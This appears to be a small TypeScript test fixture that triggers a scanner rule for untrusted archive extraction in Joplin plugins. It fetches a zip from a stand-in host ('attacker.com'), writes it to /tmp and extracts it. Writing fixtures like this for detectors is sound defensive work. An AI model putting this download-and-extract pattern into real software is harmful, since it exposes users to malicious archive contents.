// Mock dependencies to avoid TS errors
import * as joplin from 'api';
import fetch from 'node-fetch';
import * as fsNative from 'fs';

async function triggerRule() {
    // Rule 17a : Untrusted Archive Extraction
    // Flow 1 & 2: fetch -> write -> archiveExtract
    const r17aResp = await fetch('http://attacker.com/zip');
    const tempPath = '/tmp/bad.zip';
    fsNative.writeFileSync(tempPath, await r17aResp.arrayBuffer());
    await joplin.fs.archiveExtract(tempPath, '/dest');
}

export {};
